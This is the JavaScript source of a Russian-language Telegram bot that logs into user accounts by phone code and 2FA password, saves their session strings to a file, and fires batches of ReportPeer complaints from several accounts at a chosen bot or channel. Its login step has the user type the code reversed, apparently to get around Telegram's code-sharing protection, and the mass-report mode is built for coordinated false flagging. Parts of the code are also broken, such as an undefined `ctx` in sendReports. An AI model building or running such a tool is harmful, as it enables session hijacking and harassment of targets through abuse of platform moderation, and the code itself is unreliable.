require('dotenv').config();
const { Bot, GrammyError, HttpError, InlineKeyboard } = require('grammy');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const sessions = {};
const userStates = {};
const reportData = {};
const accounts = {};
const activeReports = {};

const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
if (fs.existsSync(ACCOUNTS_FILE)) {
    try {
        const data = JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8'));
        Object.assign(accounts, data);
        console.log(`✅ Загружено ${Object.keys(accounts).length} аккаунтов`);
    } catch (e) {
        console.log('❌ Ошибка загрузки аккаунтов');
    }
}

const REPORT_CATEGORIES = {
    'spam': 'Спам',
    'violence': 'Насилие',
    'pornography': 'Порнография',
    'personal_data': 'Персональные данные',
    'scam': 'Мошенничество',
    'intellectual_property': 'Нарушение авторских прав',
    'illegal_goods': 'Запрещенные товары',
    'fake': 'Фейковый аккаунт',
    'other': 'Другое'
};

const PERSONAL_DATA_SUBCATEGORIES = {
    'phone_number': 'Номер телефона',
    'address': 'Домашний адрес',
    'passport': 'Паспортные данные',
    'bank_card': 'Банковская карта',
    'photo': 'Фото без согласия',
    'other_personal': 'Другие личные данные'
};

const bot = new Bot(process.env.BOT_TOKEN);

async function isAdmin(ctx) {
    const adminIds = process.env.ADMIN_IDS.split(',').map(id => id.trim());
    return adminIds.includes(ctx.from?.id.toString());
}

function saveAccounts() {
    fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accounts, null, 2));
}

function reverseCode(code) {
    return code.toString().split('').reverse().join('');
}

function createProgressBar(current, total, length = 15) {
    const percentage = Math.round((current / total) * 100);
    const filled = Math.round((current / total) * length);
    const empty = length - filled;
    const bar = '█'.repeat(filled) + '░'.repeat(empty);
    return `${bar} ${percentage}%`;
}

bot.command('start', async (ctx) => {
    if (!(await isAdmin(ctx))) {
        return ctx.reply('⛔ Доступ запрещен');
    }

    const keyboard = new InlineKeyboard()
        .text('📱 Добавить аккаунт', 'add_account')
        .text('📋 Мои аккаунты', 'list_accounts')
        .row()
        .text('🚫 Подать жалобу', 'new_report')
        .text('📊 Массовая жалоба', 'mass_report')
        .row()
        .text('❌ Удалить аккаунт', 'delete_account')
        .text('📈 Статус', 'status');

    await ctx.reply(
        '🤖 *Бот модерации Telegram Reports v2.0*\n\n' +
        '🚀 Новые функции:\n' +
        '• Мульти-аккаунт отправка\n' +
        '• Прогресс-бар в реальном времени\n' +
        '• Отправка 1 жалоба/сек с каждого аккаунта\n' +
        '• Детальная статистика\n\n' +
        'Выберите действие:',
        {
            parse_mode: 'Markdown',
            reply_markup: keyboard
        }
    );
});bot.on('callback_query', async (ctx) => {
    const action = ctx.callbackQuery.data;
    const userId = ctx.from.id;

    if (!(await isAdmin(ctx))) {
        return ctx.answerCallbackQuery('⛔ Доступ запрещен');
    }

    switch (action) {
        case 'add_account':
            userStates[userId] = { state: 'waiting_phone' };
            await ctx.reply(
                '📱 *Добавление аккаунта*\n\n' +
                'Введите номер телефона в международном формате\n' +
                'Пример: +79123456789\n\n' +
                '⚠️ Аккаунт будет использоваться для отправки жалоб',
                { parse_mode: 'Markdown' }
            );
            break;

        case 'list_accounts':
            const userAccounts = Object.keys(accounts).filter(k => accounts[k].owner === userId);
            if (userAccounts.length === 0) {
                await ctx.reply('📋 У вас нет добавленных аккаунтов');
            } else {
                let msg = '📋 *Ваши аккаунты:*\n\n';
                for (const phone of userAccounts) {
                    const acc = accounts[phone];
                    const emoji = acc.active ? '✅' : '❌';
                    msg += `${emoji} \`${phone}\` - ${acc.active ? 'Активен' : 'Заблокирован'}\n`;
                    msg += `   └ Добавлен: ${new Date(acc.addedAt).toLocaleDateString()}\n\n`;
                }
                msg += `📊 Всего: ${userAccounts.length} | Активных: ${userAccounts.filter(k => accounts[k].active).length}`;
                await ctx.reply(msg, { parse_mode: 'Markdown' });
            }
            break;

        case 'new_report':
        case 'mass_report':
            const activeAccs = Object.keys(accounts).filter(k => 
                accounts[k].owner === userId && accounts[k].active
            );
            if (activeAccs.length === 0) {
                await ctx.reply('⚠️ Сначала добавьте активный аккаунт!');
                return;
            }
            userStates[userId] = { 
                state: 'waiting_bot_username',
                isMassReport: action === 'mass_report'
            };
            
            const mode = action === 'mass_report' ? 'МАССОВАЯ ОТПРАВКА' : 'ОБЫЧНАЯ ОТПРАВКА';
            const accInfo = action === 'mass_report' ? 
                `\n📱 Доступно аккаунтов: ${activeAccs.length}` : 
                '\n📱 Будет использован 1 случайный аккаунт';
            
            await ctx.reply(
                `🤖 *Режим: ${mode}*\n` +
                `Введите юзернейм бота или канала для жалобы\n` +
                `Пример: @bad_bot` +
                accInfo,
                { parse_mode: 'Markdown' }
            );
            break;

        case 'delete_account':
            userStates[userId] = { state: 'waiting_delete_phone' };
            const deleteAccs = Object.keys(accounts).filter(k => accounts[k].owner === userId);
            if (deleteAccs.length === 0) {
                await ctx.reply('📋 У вас нет аккаунтов для удаления');
                delete userStates[userId];
            } else {
                let msg = '🗑 *Удаление аккаунта*\n\nВыберите аккаунт:\n';
                const keyboard = new InlineKeyboard();
                for (const phone of deleteAccs) {
                    keyboard.text(`📱 ${phone}`, `del_${phone}`).row();
                }
                keyboard.text('❌ Отмена', 'cancel_delete');
                await ctx.reply(msg, { 
                    parse_mode: 'Markdown',
                    reply_markup: keyboard 
                });
            }
            break;

        case 'status':
            const totalAccs = Object.keys(accounts).filter(k => accounts[k].owner === userId).length;
            const activeAccs2 = Object.keys(accounts).filter(k => accounts[k].owner === userId && accounts[k].active).length;
            const blockedAccs = totalAccs - activeAccs2;
            
            await ctx.reply(
                '📊 *Статус системы*\n\n' +
                `📱 Всего аккаунтов: ${totalAccs}\n` +
                `✅ Активных: ${activeAccs2}\n` +
                `🚫 Заблокированных: ${blockedAccs}\n` +
                `⚡️ Скорость: 1 жалоба/сек/аккаунт\n` +
                `📦 Максимум жалоб: 10/аккаунт\n\n` +
                `🔄 Система работает в тестовом режиме`,
                { parse_mode: 'Markdown' }
            );
            break;

        case 'cancel_delete':
            delete userStates[userId];
            await ctx.editMessageText('❌ Удаление отменено');
            break;
    }

    if (action.startsWith('del_')) {
        const phoneToDelete = action.replace('del_', '');
        if (accounts[phoneToDelete] && accounts[phoneToDelete].owner === userId) {
            delete accounts[phoneToDelete];
            saveAccounts();
            await ctx.editMessageText(`✅ Аккаунт ${phoneToDelete} удален`);
        } else {
            await ctx.editMessageText('❌ Ошибка удаления аккаунта');
        }
        delete userStates[userId];
    }

    if (action.startsWith('category_')) {
        const category = action.replace('category_', '');
        if (!reportData[userId]) reportData[userId] = {};
        reportData[userId].category = category;

        if (category === 'personal_data') {
            const keyboard = new InlineKeyboard();
            for (const [key, value] of Object.entries(PERSONAL_DATA_SUBCATEGORIES)) {
                keyboard.text(value, `subcategory_${key}`).row();
            }
            keyboard.text('⬅️ Назад', 'back_to_categories');
            await ctx.editMessageText('🔍 *Выберите подкатегорию персональных данных:*', {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });
        } else {
            userStates[userId] = { state: 'waiting_report_text' };
            await ctx.editMessageText(
                `📝 *Категория: ${REPORT_CATEGORIES[category]}*\n\n` +
                `Введите текст жалобы от пользователя:`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    if (action.startsWith('subcategory_')) {
        const subcategory = action.replace('subcategory_', '');
        if (!reportData[userId]) reportData[userId] = {};
        reportData[userId].subcategory = subcategory;
        userStates[userId] = { state: 'waiting_report_text' };
        await ctx.editMessageText(
            `📝 *Категория: Персональные данные*\n` +
            `🔍 *Подкатегория: ${PERSONAL_DATA_SUBCATEGORIES[subcategory]}*\n\n` +
            `Введите текст жалобы от пользователя:`,
            { parse_mode: 'Markdown' }
        );
    }

    if (action === 'back_to_categories') {
        const keyboard = new InlineKeyboard();
        for (const [key, value] of Object.entries(REPORT_CATEGORIES)) {
            keyboard.text(value, `category_${key}`).row();
        }
        await ctx.editMessageText('📋 *Выберите категорию нарушения:*', {
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    }

    await ctx.answerCallbackQuery();
});bot.on('message:text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;

    if (!(await isAdmin(ctx))) {
        return ctx.reply('⛔ Доступ запрещен');
    }

    const state = userStates[userId]?.state;

    if (!state) {
        return ctx.reply('Используйте /start для начала работы');
    }

    switch (state) {
        case 'waiting_phone':
            const phone = text.replace(/\s+/g, '');
            userStates[userId] = {
                state: 'waiting_code',
                phone: phone
            };
            
            try {
                const client = new TelegramClient(
                    new StringSession(''),
                    parseInt(process.env.API_ID || '2040'),
                    process.env.API_HASH || 'b18441a1ff607e10a989891a5462e28b',
                    { connectionRetries: 5 }
                );
                await client.connect();
                
                const result = await client.sendCode(
                    { 
                        apiId: parseInt(process.env.API_ID || '2040'), 
                        apiHash: process.env.API_HASH || 'b18441a1ff607e10a989891a5462e28b' 
                    },
                    phone
                );
                
                userStates[userId].phoneCodeHash = result.phoneCodeHash;
                userStates[userId].client = client;
                
                await ctx.reply(
                    '📨 *Код подтверждения отправлен*\n\n' +
                    'Введите код из SMS/Telegram\n' +
                    '⚠️ Бот автоматически перевернет код для безопасности',
                    { parse_mode: 'Markdown' }
                );
            } catch (error) {
                console.error('Error sending code:', error);
                await ctx.reply(
                    '❌ *Ошибка отправки кода*\n\n' +
                    `Причина: ${error.message}\n` +
                    'Проверьте номер телефона и попробуйте снова.',
                    { parse_mode: 'Markdown' }
                );
                delete userStates[userId];
            }
            break;

        case 'waiting_code':
            const reversedCode = reverseCode(text);
            await ctx.reply('🔄 Авторизация...');
            
            try {
                const client = userStates[userId].client;
                const phone = userStates[userId].phone;
                const phoneCodeHash = userStates[userId].phoneCodeHash;

                const signInResult = await client.invoke(
                    new Api.auth.SignIn({
                        phoneNumber: phone,
                        phoneCodeHash: phoneCodeHash,
                        phoneCode: reversedCode
                    })
                );

                if (signInResult._ === 'auth.authorizationSignUpRequired') {
                    await ctx.reply('❌ Аккаунт не зарегистрирован');
                    delete userStates[userId];
                    return;
                }

                const sessionString = client.session.save();
                accounts[phone] = {
                    session: sessionString,
                    owner: userId,
                    active: true,
                    addedAt: new Date().toISOString()
                };
                saveAccounts();

                await ctx.reply(
                    '✅ *Аккаунт успешно добавлен!*\n\n' +
                    `📱 Номер: \`${phone}\`\n` +
                    `📅 Дата: ${new Date().toLocaleString()}\n\n` +
                    'Теперь вы можете отправлять жалобы с этого аккаунта.',
                    { parse_mode: 'Markdown' }
                );
                delete userStates[userId];
            } catch (error) {
                console.error('Sign in error:', error);
                if (error.message.includes('2FA') || error.message.includes('password')) {
                    userStates[userId].state = 'waiting_2fa';
                    await ctx.reply(
                        '🔐 *Требуется облачный пароль (2FA)*\n\n' +
                        'Введите ваш облачный пароль:',
                        { parse_mode: 'Markdown' }
                    );
                } else {
                    await ctx.reply(
                        '❌ *Ошибка входа*\n\n' +
                        `Причина: ${error.message}\n` +
                        'Проверьте код и попробуйте снова.',
                        { parse_mode: 'Markdown' }
                    );
                    delete userStates[userId];
                }
            }
            break;

        case 'waiting_2fa':
            await ctx.reply('🔐 Проверка пароля...');
            
            try {
                const client = userStates[userId].client;
                const phone = userStates[userId].phone;

                const passwordInfo = await client.invoke(new Api.account.GetPassword());
                const { srp_id, current_algo, srp_B } = passwordInfo;
                const { g, p, salt1, salt2 } = current_algo;

                const { A, M1 } = await Api.mtproto.crypto.srp.computeCheck(text, {
                    g: Buffer.from(g),
                    p: Buffer.from(p),
                    salt1: Buffer.from(salt1),
                    salt2: Buffer.from(salt2),
                    gB: Buffer.from(srp_B),
                    password: text
                });

                await client.invoke(
                    new Api.auth.CheckPassword({
                        password: {
                            _: 'inputCheckPasswordSRP',
                            srpId: srp_id,
                            A: A,
                            M1: M1
                        }
                    })
                );

                const sessionString = client.session.save();
                accounts[phone] = {
                    session: sessionString,
                    owner: userId,
                    active: true,
                    addedAt: new Date().toISOString()
                };
                saveAccounts();

                await ctx.reply(
                    '✅ *Аккаунт успешно авторизован с 2FA!*\n\n' +
                    `📱 Номер: \`${phone}\`\n` +
                    '🔐 2FA: Подключена\n' +
                    `📅 Дата: ${new Date().toLocaleString()}`,
                    { parse_mode: 'Markdown' }
                );
                delete userStates[userId];
            } catch (error) {
                console.error('2FA error:', error);
                await ctx.reply(
                    '❌ *Неверный пароль 2FA*\n\n' +
                    'Попробуйте снова или используйте /start для отмены.',
                    { parse_mode: 'Markdown' }
                );
            }
            break;

        case 'waiting_bot_username':
            if (!reportData[userId]) reportData[userId] = {};
            reportData[userId].targetUsername = text.replace('@', '').replace('https://t.me/', '');
            
            const keyboard = new InlineKeyboard();
            for (const [key, value] of Object.entries(REPORT_CATEGORIES)) {
                keyboard.text(value, `category_${key}`).row();
            }
            
            await ctx.reply(
                `🎯 *Цель:* @${reportData[userId].targetUsername}\n\n` +
                '📋 Выберите категорию нарушения:',
                {
                    parse_mode: 'Markdown',
                    reply_markup: keyboard
                }
            );
            userStates[userId] = { state: 'waiting_category' };
            break;        case 'waiting_report_text':
            if (!reportData[userId]) reportData[userId] = {};
            reportData[userId].reportText = text;
            
            const isMass = userStates[userId].isMassReport;
            const maxReports = 10;
            
            const summary = 
                '📋 *Сводка жалобы:*\n\n' +
                `🎯 Цель: @${reportData[userId].targetUsername}\n` +
                `📂 Категория: ${REPORT_CATEGORIES[reportData[userId].category]}\n` +
                (reportData[userId].subcategory ? 
                    `🔍 Подкатегория: ${PERSONAL_DATA_SUBCATEGORIES[reportData[userId].subcategory]}\n` : '') +
                `📝 Текст: ${reportData[userId].reportText}\n` +
                `🔄 Режим: ${isMass ? 'Массовая отправка' : 'Обычная отправка'}\n\n` +
                `Введите количество жалоб (1-${maxReports}):`;

            userStates[userId] = { 
                state: 'waiting_report_count',
                isMassReport: isMass
            };
            
            await ctx.reply(summary, { parse_mode: 'Markdown' });
            break;

        case 'waiting_report_count':
            const count = parseInt(text);
            if (isNaN(count) || count < 1 || count > 10) {
                await ctx.reply('❌ Введите число от 1 до 10');
                return;
            }

            reportData[userId].count = count;
            const isMassReport = userStates[userId].isMassReport;
            
            const availableAccounts = Object.keys(accounts).filter(k => 
                accounts[k].owner === userId && accounts[k].active
            );

            if (availableAccounts.length === 0) {
                await ctx.reply('❌ Нет активных аккаунтов');
                delete reportData[userId];
                delete userStates[userId];
                return;
            }

            const accountsToUse = isMassReport ? 
                availableAccounts.slice(0, Math.min(count, availableAccounts.length)) : 
                [availableAccounts[Math.floor(Math.random() * availableAccounts.length)]];

            const target = reportData[userId].targetUsername;
            const category = reportData[userId].category;
            const subcategory = reportData[userId].subcategory;
            const reason = reportData[userId].reportText;

            const progressMsg = await ctx.reply(
                '🚀 *Запуск отправки жалоб*\n\n' +
                `🎯 Цель: @${target}\n` +
                `📱 Аккаунтов: ${accountsToUse.length}\n` +
                `📦 Всего жалоб: ${count}\n\n` +
                '⏳ Подготовка...\n' +
                '```\nПрогресс: 0%\n```',
                { parse_mode: 'Markdown' }
            );

            const reportResult = await sendReports(
                userId, 
                accountsToUse, 
                target, 
                count, 
                reason, 
                category,
                subcategory,
                progressMsg
            );

            const successRate = Math.round((reportResult.success / reportResult.total) * 100);
            const statusEmoji = successRate === 100 ? '✅' : successRate >= 80 ? '⚠️' : '❌';
            
            await ctx.reply(
                `${statusEmoji} *Отправка завершена!*\n\n` +
                `📊 *Статистика:*\n` +
                `├ Успешно: ${reportResult.success}/${reportResult.total}\n` +
                `├ Ошибок: ${reportResult.failed}\n` +
                `├ Пропущено: ${reportResult.skipped}\n` +
                `└ Успешность: ${successRate}%\n\n` +
                `🎯 *Детали:*\n` +
                `├ Цель: @${target}\n` +
                `├ Категория: ${REPORT_CATEGORIES[category]}\n` +
                (subcategory ? `├ Подкатегория: ${PERSONAL_DATA_SUBCATEGORIES[subcategory]}\n` : '') +
                `├ Аккаунтов: ${reportResult.accountsUsed}\n` +
                `└ Время: ${reportResult.time}с\n\n` +
                `📝 *По аккаунтам:*\n` +
                reportResult.accountStats.map(stat => 
                    `${stat.success ? '✅' : '❌'} \`${stat.phone}\`: ${stat.sent}/${stat.expected}`
                ).join('\n'),
                { parse_mode: 'Markdown' }
            );

            delete reportData[userId];
            delete userStates[userId];
            break;

        case 'waiting_delete_phone':
            const phoneToDelete = text.replace(/\s+/g, '');
            if (accounts[phoneToDelete] && accounts[phoneToDelete].owner === userId) {
                delete accounts[phoneToDelete];
                saveAccounts();
                await ctx.reply(
                    '✅ *Аккаунт удален*\n\n' +
                    `📱 Номер: \`${phoneToDelete}\`\n` +
                    `Осталось аккаунтов: ${Object.keys(accounts).filter(k => accounts[k].owner === userId).length}`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                await ctx.reply('❌ Аккаунт не найден или не принадлежит вам');
            }
            delete userStates[userId];
            break;

        default:
            await ctx.reply('Неизвестная команда. Используйте /start');
    }
});

async function sendReports(userId, accountsToUse, target, totalReports, reason, category, subcategory, progressMsg) {
    const startTime = Date.now();
    const result = {
        success: 0,
        failed: 0,
        skipped: 0,
        total: totalReports,
        accountsUsed: accountsToUse.length,
        time: 0,
        accountStats: []
    };

    const reportsPerAccount = Math.ceil(totalReports / accountsToUse.length);
    const accountTasks = accountsToUse.map((phone, index) => {
        const start = index * reportsPerAccount;
        const end = Math.min(start + reportsPerAccount, totalReports);
        const count = end - start;
        return { phone, count, sent: 0, success: true };
    });

    result.accountStats = accountTasks.map(t => ({ 
        phone: t.phone, 
        sent: 0, 
        expected: t.count, 
        success: true 
    }));

    let completedReports = 0;
    const updateProgress = async () => {
        const progress = createProgressBar(completedReports, totalReports);
        const elapsed = Math.round((Date.now() - startTime) / 1000);
        const speed = completedReports > 0 ? (completedReports / elapsed).toFixed(1) : 0;
        
        try {
            await ctx.api.editMessageText(
                progressMsg.chat.id,
                progressMsg.message_id,
                '🚀 *Отправка жалоб*\n\n' +
                `🎯 Цель: @${target}\n` +
                `📱 Аккаунтов: ${accountsToUse.length}\n` +
                `📦 Прогресс: ${completedReports}/${totalReports}\n\n` +
                '```\n' +
                `${progress}\n` +
                '```\n\n' +
                `⚡️ Скорость: ${speed} жалоб/сек\n` +
                `⏱ Прошло: ${elapsed}с\n` +
                `✅ Успешно: ${result.success}\n` +
                `❌ Ошибок: ${result.failed}`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            // Игнорируем ошибки обновления
        }
    };

    const sendPromises = accountTasks.map(async (task) => {
        const statIndex = result.accountStats.findIndex(s => s.phone === task.phone);
        
        try {
            const client = new TelegramClient(
                new StringSession(accounts[task.phone].session),
                parseInt(process.env.API_ID || '2040'),
                process.env.API_HASH || 'b18441a1ff607e10a989891a5462e28b',
                { connectionRetries: 3 }
            );
            await client.connect();

            let entity;
            try {
                entity = await client.getEntity(target);
            } catch (e) {
                console.error(`Error getting entity for ${task.phone}:`, e);
                result.failed += task.count;
                if (statIndex >= 0) result.accountStats[statIndex].success = false;
                return;
            }

            for (let i = 0; i < task.count; i++) {
                try {
                    await client.invoke(
                        new Api.account.ReportPeer({
                            peer: entity,
                            reason: new Api.InputReportReasonOther({
                                text: reason
                            }),
                            message: reason
                        })
                    );
                    
                    task.sent++;
                    result.success++;
                    completedReports++;
                    
                    if (statIndex >= 0) result.accountStats[statIndex].sent = task.sent;
                    
                    await updateProgress();
                    
                    if (i < task.count - 1) {
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                } catch (e) {
                    console.error(`Report error for ${task.phone}:`, e);
                    result.failed++;
                    completedReports++;
                    
                    if (e.message.includes('FLOOD') || e.message.includes('flood')) {
                        console.log(`Flood wait for ${task.phone}, skipping remaining...`);
                        result.skipped += (task.count - i - 1);
                        completedReports += (task.count - i - 1);
                        await updateProgress();
                        break;
                    }
                }
            }

            await client.disconnect();
        } catch (error) {
            console.error(`Account ${task.phone} failed:`, error);
            result.failed += task.count;
            completedReports += task.count;
            if (statIndex >= 0) result.accountStats[statIndex].success = false;
            await updateProgress();
        }
    });

    await Promise.all(sendPromises);

    result.time = Math.round((Date.now() - startTime) / 1000);
    
    await updateProgress();

    return result;
}

bot.command('report', async (ctx) => {
    if (!(await isAdmin(ctx))) {
        return ctx.reply('⛔ Доступ запрещен');
    }
    
    const activeAccs = Object.keys(accounts).filter(k => 
        accounts[k].owner === ctx.from.id && accounts[k].active
    );
    
    if (activeAccs.length === 0) {
        await ctx.reply('⚠️ Сначала добавьте активный аккаунт через /start');
        return;
    }
    
    userStates[ctx.from.id] = { 
        state: 'waiting_bot_username',
        isMassReport: false 
    };
    
    await ctx.reply(
        '🚀 *Быстрая жалоба*\n\n' +
        '🤖 Введите юзернейм бота или канала\n' +
        'Пример: @bad_bot\n\n' +
        `📱 Доступно аккаунтов: ${activeAccs.length}`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('massreport', async (ctx) => {
    if (!(await isAdmin(ctx))) {
        return ctx.reply('⛔ Доступ запрещен');
    }
    
    const activeAccs = Object.keys(accounts).filter(k => 
        accounts[k].owner === ctx.from.id && accounts[k].active
    );
    
    if (activeAccs.length < 2) {
        await ctx.reply('⚠️ Для массовой отправки нужно минимум 2 аккаунта');
        return;
    }
    
    userStates[ctx.from.id] = { 
        state: 'waiting_bot_username',
        isMassReport: true 
    };
    
    await ctx.reply(
        '🚀 *Массовая жалоба*\n\n' +
        '🤖 Введите юзернейм бота или канала\n' +
        'Пример: @bad_bot\n\n' +
        `📱 Будет использовано аккаунтов: ${activeAccs.length}\n` +
        '⚡️ Скорость: 1 жалоба/сек/аккаунт',
        { parse_mode: 'Markdown' }
    );
});

bot.command('accounts', async (ctx) => {
    if (!(await isAdmin(ctx))) {
        return ctx.reply('⛔ Доступ запрещен');
    }
    
    const userId = ctx.from.id;
    const userAccounts = Object.keys(accounts).filter(k => accounts[k].owner === userId);
    
    if (userAccounts.length === 0) {
        await ctx.reply('📋 У вас нет добавленных аккаунтов');
        return;
    }
    
    let msg = '📋 *Ваши аккаунты:*\n\n';
    for (const phone of userAccounts) {
        const acc = accounts[phone];
        const status = acc.active ? '✅ Активен' : '❌ Заблокирован';
        msg += `${status}\n`;
        msg += `📱 \`${phone}\`\n`;
        msg += `📅 Добавлен: ${new Date(acc.addedAt).toLocaleDateString()}\n`;
        msg += `🆔 Владелец: ${acc.owner}\n\n`;
    }
    
    msg += `📊 Всего: ${userAccounts.length} | Активных: ${userAccounts.filter(k => accounts[k].active).length}`;
    
    await ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.catch((err) => {
    const ctx = err.ctx;
    console.error(`Error while handling update ${ctx.update.update_id}:`);
    const e = err.error;
    
    if (e instanceof GrammyError) {
        console.error('Error in request:', e.description);
    } else if (e instanceof HttpError) {
        console.error('Could not contact Telegram:', e);
    } else {
        console.error('Unknown error:', e);
    }
});

app.get('/', (req, res) => {
    res.json({
        status: 'online',
        accounts: Object.keys(accounts).length,
        uptime: process.uptime(),
        version: '2.0.0'
    });
});

app.get('/status', (req, res) => {
    const totalAccounts = Object.keys(accounts).length;
    const activeAccounts = Object.keys(accounts).filter(k => accounts[k].active).length;
    
    res.json({
        total_accounts: totalAccounts,
        active_accounts: activeAccounts,
        blocked_accounts: totalAccounts - activeAccounts,
        users: [...new Set(Object.values(accounts).map(a => a.owner))].length
    });
});

async function startBot() {
    try {
        await bot.start();
        console.log('✅ Bot started successfully!');
        console.log(`📱 Loaded accounts: ${Object.keys(accounts).length}`);
    } catch (error) {
        console.error('❌ Bot start error:', error);
    }
}

app.listen(PORT, () => {
    console.log(`🌐 Server running on port ${PORT}`);
    console.log('🚀 Bot v2.0 - Multi-account reporting system');
});

startBot();

process.on('SIGTERM', () => {
    console.log('📥 SIGTERM received. Saving accounts...');
    saveAccounts();
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('📥 SIGINT received. Saving accounts...');
    saveAccounts();
    process.exit(0);
});
